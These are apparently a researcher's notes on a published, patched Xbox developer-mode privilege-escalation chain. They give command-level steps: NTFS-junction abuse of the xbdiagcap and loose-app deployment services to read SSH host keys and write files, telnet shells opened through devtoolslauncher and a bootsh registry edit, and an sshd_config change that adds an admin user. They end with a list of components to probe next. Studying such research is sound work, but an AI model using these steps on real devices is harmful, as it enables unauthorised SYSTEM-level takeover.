# Artifice autopsy — devmode privesc methodology (Kudayasu, 2023)

Source: https://kudayasu.github.io/an-autopsy-of-artifice/ (retrieved 2026-10-12). Patched 10.0.26100.1968 — but the *component inventory and technique classes* are the value for Phase 3/4 re-analysis.

## Recon facts
- Device discovery protocols (winappdeploycmd `Microsoft.Tools.Connectivity.dll`): **Sirep, IpOverUsb, mDNS**
- mDNS advertises: PTR `XBOXONE._sshsvc._tcp.local`; firewall rules `XboxSRA-mDNS-In/Out-UDP`
- **TestSirep ships in retail SystemOS** via package `Microsoft-OneCore-Sirep-TSP` (SirepRAT: github.com/SafeBreach-Labs/SirepRAT) → Sirep surface exists outside dev mode? (verify on Series)
- WDP SMB creds endpoint: `/ext/smb/developerfolder`; WDP needs CSRF token (wrapper: github.com/microsoft/WindowsDevicePortalWrapper)

## Technique 1 — xbdiagcap FileCopyPlugin junction (arbitrary file READ)
- `xbdiagcap` = Xbox WER-like diagnostic capture service ("Report a Problem")
- `C:\xbdiag\FileCopyPlugin\Settings.txt` lists wildcard copy locations (e.g. `S:\Settings\*`)
- `mklink /J S:\Settings <target-dir>` → `xbdiagcap start -p FileCopyPlugin` → `stop -d <outdir>` copies target dir contents out
- Used to steal ssh host keys/config from `T:\ProgramData\ssh`
- **Target class: diagnostic service path traversal via NT junctions**

## Technique 2 — WDP loose-folder deployment junction traversal (arbitrary WRITE)
- Loose-app deployment (`AuthKeys` folder + minimal AppxManifest.xml) traverses an attacker-created junction `D:\DevelopmentFiles\LooseApps\AuthKeys -> systemprofile\.ssh`
- Packaged-app deployment removes untrusted mount points; **loose-folder deployment does NOT** (error shown, junction left, contents written; ACLs from destination)
- **Target class: WDP package-manager broker mount-point validation asymmetry**

## Technique 3 — devtoolslauncher (VSProfilingAccount shell)
- `devtoolslauncher launchforprofiling telnetd "cmd.exe 24"` → telnet shell as VSProfilingAccount on port 24
- WDP process kill: `DELETE /api/taskmanager/process?pid={id}` (used to kill Sshd mid-cycle)

## Final step — sshd_config AuthorizedKeysCommand
- Modified sshd_config (AuthorizedKeysCommand → elevate.cmd as SYSTEM) + net1.exe → creates `admin` user in every localgroup
- Depends on openssh-portable PRs #478/#479 behavior

## SYSTEM shell
- `bootsh` service: `REG ADD ...Services\Bootsh\Parameters\Commands /v Xrun /d "telnetd.exe cmd.exe 23"` → `sc start bootsh` → telnet :23 = SYSTEM. Restore with `xrun.exe SystemBootTasks`.

## Post-elevation tooling referenced
- QuantumTunnel (flash dump): github.com/TitleOS/QuantumTunnel
- XboxDevModeBatchScripts (telemetry off): github.com/xboxoneresearch/XboxDevModeBatchScripts
- dbgsrv/windbg usermode debugging; clicon to avoid firewall; NtObjectManager (PWSH)
- System.xvd overlay xvd creation (caveats) — wiki devmode-systemxvd-read-write

## Phase 3/4 target list (from this autopsy)
1. `xbdiagcap` FileCopyPlugin (junction validation)
2. WDP loose-folder deployment mount-point handling
3. `devtoolslauncher` launchforprofiling surface
4. `bootsh` Xrun command registry path
5. Sirep TestSirep retail presence (Microsoft-OneCore-Sirep-TSP)
6. WDP taskmanager DELETE endpoint authz
